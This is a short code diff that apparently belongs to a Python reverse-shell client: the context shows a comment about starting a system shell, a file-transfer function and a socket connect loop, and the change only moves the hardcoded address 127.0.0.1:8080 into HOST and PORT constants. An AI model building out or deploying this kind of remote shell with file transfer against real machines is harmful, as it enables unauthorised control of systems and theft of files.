@@ -6,6 +6,11 @@ import subprocess  # to start the shell in the system
 import os  # os library
 
 
+# host and port
+HOST = "127.0.0.1"
+PORT = 8080
+
+
 # tranfer file
 def transfer(s, path):
 
@@ -27,7 +32,7 @@ def transfer(s, path):
 def connect():
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(("127.0.0.1", 8080))
+    s.connect((HOST, PORT))
 
     while True:
 
